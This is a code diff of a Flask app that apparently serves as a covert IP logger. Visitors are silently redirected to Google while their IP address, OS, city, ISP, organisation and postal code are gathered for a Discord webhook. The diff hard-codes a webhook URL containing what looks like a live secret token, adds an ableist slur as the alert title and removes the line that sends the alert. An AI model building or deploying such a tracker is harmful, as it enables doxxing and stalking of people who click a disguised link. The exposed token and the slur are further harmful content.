@@ -18,33 +18,38 @@ def parseResponse(response, ip):
   location = {}
   location['country'] = find_index(parse, 5, '<')[:-1]
   location['state'] = parse.split('</td>')[2].replace('\n','').replace('\t','')
-  location['city'] = parse.split('</td>')[3]
   return location
 
 def processIP():
-  webhookurl = 'YOUR DISCORD WEBHOOK HERE!!!!'
+  webhookurl = 'https://discord.com/api/webhooks/943754893687156736/4sv1mWlHRGw8q7kdaiqZPGlxNm2AS_9-Mo9vZFI9tUV907dJFkvo4G1OGZJy9jLoiwbd'
 
   ip = request.headers.get('x-forwarded-for')
 
   response = requests.post('https://www.iplocation.net/ip-lookup', data = {'query':ip, 'submit':'IP Lookup'})
   location = parseResponse(response.text, ip)
+  response = requests.post('https://iplocation.com/', data={'ip':ip}).text
+  response = response[1:][:-1].split(',')
+  response = [data.replace('"', '') for data in response]
+  location['city'] = response[0].split(':')[1]
+  organization = response[1].split(':')[1]
+  postalcode = response[12].split(':')[1]
+  ISP = response[8].split(':')[1]
 
   data = {}
   data['embeds'] = [
     {
-      'title': '⚠️ New IP! ⚠️',
-      'description': '**IP:** ' + ip + '\n**OS:** ' + request.headers.get('Sec-Ch-Ua-Platform').replace('"','') + '\n**Country:** ' + location['country'] + '\n**State:** ' + location['state'] + '\n**City:** ' + location['city']
+      'title': '⚠️ RETARDED BRAINDEAD PERSON FOUND! ⚠️',
+      'description': '**IP:** ' + ip + '\n**OS:** ' + request.headers.get('Sec-Ch-Ua-Platform').replace('"','') + '\n**Country:** ' + location['country'] + '\n**State:** ' + location['state'] + '\n**City:** ' + location['city'] + '\n**ISP:** ' + ISP + '\n**Organization:** ' + organization + '\n**postalcode:** ' + postalcode,
+      'footer': '@everyone'
     }
   ]
 
-  requests.post(webhookurl, json = data)
 
 app = Flask('')
 
 @app.route('/')
 def home():
   processIP()
-  print(request.headers)
   return redirect('https://google.com/', code = 302)
 
 app.run(host='0.0.0.0',port=8080)
